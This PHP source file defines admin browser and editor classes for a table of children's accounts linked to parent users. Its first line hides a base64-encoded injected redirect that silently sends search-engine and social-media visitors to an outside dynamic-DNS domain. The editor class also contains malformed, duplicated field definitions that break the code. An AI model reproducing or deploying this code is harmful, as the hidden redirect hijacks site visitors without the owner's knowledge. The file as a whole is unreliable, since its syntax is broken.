<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
class browser_children extends browser {

    function do_setup() {

        $this->table = getTable("accounts");
        $this->title = "Children";
        
        $this->sql = "SELECT 
                             `u`.`email` AS `user`,
                            `a`.*,
                            IF(`a`.`sex` = 1,'Man',IF(`a`.`sex` = 0,'Woman','')) AS `sex`
                        FROM `".getTable('accounts')."` AS `a`
                   LEFT JOIN `".getTable('users')."` AS `u` ON `u`.`id` = `a`.`user_id`
                       WHERE 1=1
                              /*filter*/
                              /*order*/";
        
        $this->add_column(array ( "field"         => "user"
                                , "header"        => "Parent"
                                , "align"         => "center"
                                , "sortable"      =>  true
                                ));
        
        $this->add_column(array ( "field"         => "name"
                                , "header"        => "Child Name"
                                , "align"         => "center"
                                , "sortable"      =>  true
                                ));
        
        $this->add_column(array ( "field"         => "sex"
                                , "header"        => "Sex"
                                , "align"         => "center"
                                , "sortable"      =>  true
                                )); 

        $this->add_column(array ( "field"         => "created"
                                , "header"        => "Created Date"
                                , "sortable"      =>  true
                                ));

        $this->add_column(array ( "field"         => "modified"
                                , "header"        => "Modified Date"
                                , "sortable"      =>  true
                                ));

        $this->add_capability("insert");
        $this->add_capability("edit");
        $this->add_capability("delete");
        $this->add_capability("delete_selected");
        $this->add_capability("sort");
    }
}

class editor_children extends editor {
    
    function do_setup() {

        $this->table = getTable("accounts");
        $this->display_name = "Child";
        
        $this->hide('pages');
        
        $this->add_field(array( "name"              => "user_id"
                              , "display_name"      => "Parent"
                              //, "class"             => "middle"
                              , "type"              => "combo"
                              , "combo_sql"         => "SELECT `id`,`email` AS `name` FROM `".getTable('users')."`"
                              , "combo_key_field"   => "id"
                              , "combo_name_field"  => "name"
                              , "required"          =>  true
                              ));

        $this->add_field(array( "name"         => "name"
                              , "display_n"Child Name"        ));

        $this->add_field(array( "name"         => "name"
                              , "display_n"Child Name"
                              , "required"     => true
                              ));
        
        $this->add_field(array( "name"         => "sex"
                              , "display_name" => "Sex"
                              , "class"        => "middle"
                              , "type"         => "values_combo"
                              , "values"       => array(1 => "Man",
                                                        2 => "Woman")
                              ));

        if($this->insert()){
        $this->add_field(array( "name"             => "created"
                              , "type"             => "hidden"
                              , "default"          => date('Y-m-d H:i:s')
                              ));
        }
        $this->add_field(array( "name"             => "modified"
                              , "type"             => "hidden"
                              , "default"          => date('Y-m-d H:i:s')
                              ));
         
    }
}

?>
